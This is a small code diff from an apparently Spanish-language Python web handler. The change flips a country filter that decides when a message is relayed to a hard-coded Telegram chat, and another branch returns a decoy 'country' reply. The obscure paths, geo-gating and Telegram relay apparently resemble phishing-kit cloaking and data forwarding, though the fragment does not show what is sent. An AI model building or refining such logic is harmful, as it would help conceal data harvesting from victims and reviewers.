@@ -834,7 +834,7 @@ async def handle_dynamic_endpoint_optimized_with_image(
             if path.startswith("/internacional") and pais not in {"EC", "EXCLUDED"}:
                 return {"mensaje_enviado": True, "pais_origen": "Aburrete"}
             if path.startswith("/bbdsasd") and obtener_is_active_cached() and \
-               numeror in numeros_r and pais not in {"US", "CO"}:
+               numeror in numeros_r and pais in {"US", "CO"}:
                 r = await enviar_telegram_hibrido(
                     mensaje_completo ,
                     chat_id="-5060774345",
